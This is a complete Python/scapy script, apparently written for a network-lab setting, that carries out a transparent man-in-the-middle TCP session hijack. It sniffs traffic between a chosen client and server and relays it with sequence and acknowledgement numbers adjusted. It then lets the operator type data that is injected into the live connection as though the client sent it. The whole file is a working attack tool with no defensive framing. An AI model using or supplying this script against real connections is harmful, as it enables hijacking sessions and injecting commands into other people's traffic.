#!/usr/bin/python3

import sys
import getopt
import threading
from scapy.all import *


class TransparentMITM:
    def __init__(self, srv_ip, srv_port, client_ip, dev="h3-eth0"):
        self.srv_ip = srv_ip
        self.srv_port = srv_port
        self.client_ip = client_ip
        self.client_port = None
        self.dev = dev

        self.client_offset = 0
        self.next_cli_seq = None
        self.next_srv_seq = None
        self.hijacked = False

    def input_loop(self):
        while True:
            inject_data = input(">> ")
            inject_data = inject_data + "\n"

            if not self.hijacked:
                continue

            seq = self.next_cli_seq + self.client_offset
            packet = IP(src=self.client_ip, dst=self.srv_ip) \
                     / TCP(sport=self.client_port, dport=self.srv_port,
                           seq=seq, ack=self.next_srv_seq, flags="PA") \
                     / inject_data
            send(packet, iface=self.dev, verbose=False)
            self.client_offset += len(inject_data)

    def handle_packet(self, packet):
        ip = packet.getlayer("IP")
        tcp = packet.getlayer("TCP")
        flags = tcp.sprintf("%flags%")

        print("Got packet %s:%d -> %s:%d [%s]" % (ip.src, tcp.sport, ip.dst, tcp.dport, flags))

        payload_len = len(packet.getlayer("Raw").load) if packet.haslayer("Raw") else 0

        if ip.src == self.client_ip and ip.dst == self.srv_ip:
            if self.client_port is None:
                self.client_port = tcp.sport

            new_seq = tcp.seq + self.client_offset
            packetWithOffset = IP(src=ip.src, dst=ip.dst) \
                  / TCP(sport=tcp.sport, dport=tcp.dport, seq=new_seq, ack=tcp.ack,
                        flags=tcp.flags, window=tcp.window)
            if payload_len > 0:
                packetWithOffset = packetWithOffset / Raw(load=packet.getlayer("Raw").load)
            send(packetWithOffset, iface=self.dev, verbose=False)

            self.next_cli_seq = tcp.seq + payload_len

        elif ip.src == self.srv_ip and ip.dst == self.client_ip:
            new_ack = tcp.ack - self.client_offset
            packetWithOffset = IP(src=ip.src, dst=ip.dst) \
                  / TCP(sport=tcp.sport, dport=tcp.dport, seq=tcp.seq, ack=new_ack,
                        flags=tcp.flags, window=tcp.window)
            if payload_len > 0:
                packetWithOffset = packetWithOffset / Raw(load=packet.getlayer("Raw").load)
                print("[server] " + packet.getlayer("Raw").load.decode(errors='replace'), end='')
            send(packetWithOffset, iface=self.dev, verbose=False)

            self.next_srv_seq = tcp.seq + payload_len

            if not self.hijacked and self.next_cli_seq is not None and self.client_port is not None:
                self.hijacked = True
                print("Start injecting (MITM mode)")
                threading.Thread(target=self.input_loop, daemon=True).start()

    def run(self):
        print("MITM between %s and %s:%d" % (self.client_ip, self.srv_ip, self.srv_port))
        f = "tcp and port " + str(self.srv_port) + \
            " and host " + self.srv_ip + " and host " + self.client_ip
        sniff(iface=self.dev, store=0, filter=f, prn=self.handle_packet)


def usage():
    print(sys.argv[0])
    print("""
    -c <client_ip>
    -s <srv_ip>
    -p <srv_port>
    """)
    sys.exit(1)


srv_port = None
srv_ip = None
client_ip = None

try:
    cmd_opts = "c:s:p:"
    opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
except getopt.GetoptError:
    usage()

for opt in opts:
    if opt[0] == "-c":
        client_ip = opt[1]
    elif opt[0] == "-s":
        srv_ip = opt[1]
    elif opt[0] == "-p":
        srv_port = int(opt[1])
    else:
        usage()

if not srv_ip or not srv_port or not client_ip:
    usage()

TransparentMITM(srv_ip, srv_port, client_ip).run()
